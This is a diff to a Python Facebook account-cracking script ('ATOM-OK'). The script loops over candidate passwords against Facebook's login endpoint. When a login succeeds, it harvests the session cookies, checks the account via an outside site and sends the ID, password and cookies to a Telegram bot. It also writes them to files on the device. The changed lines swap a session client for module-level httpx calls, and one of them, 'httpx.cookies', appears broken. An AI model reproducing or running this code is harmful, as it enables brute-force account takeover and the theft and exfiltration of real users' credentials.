@@ -1047,8 +1047,8 @@ def m1(ids,pwv):
     warna = random.choice(my_color)
     try:
         for pas in pwv:
-            session = httpx.Client()
-            free_fb = session.get(f"https://mbasic.facebook.com").text
+            #session = httpx.Client()
+            free_fb = httpx.get(f"https://mbasic.facebook.com").text
             info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
             update= {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
@@ -1066,10 +1066,10 @@ def m1(ids,pwv):
             'DNT': '1',
             'Pragma': 'no-cache',
             'TE': 'Trailers', }
-            response=session.post('https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data = info,headers = update)
-            log_cookies=session.cookies.get_dict().keys()
+            response=httpx.post('https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data = info,headers = update)
+            log_cookies=httpx.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
-                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
+                kuki=";".join([f"{key}={httpx.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 check =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={cid}"
                 bithi = httpx.get(check).text
@@ -1077,7 +1077,7 @@ def m1(ids,pwv):
                      print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                      print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                      statusok = (f" {cid} | {pas} | {kuki} ")
-                     cek_apk(kuki)
+                     #cek_apk(kuki)
                      httpx.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                      open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                      oks.append(cid)
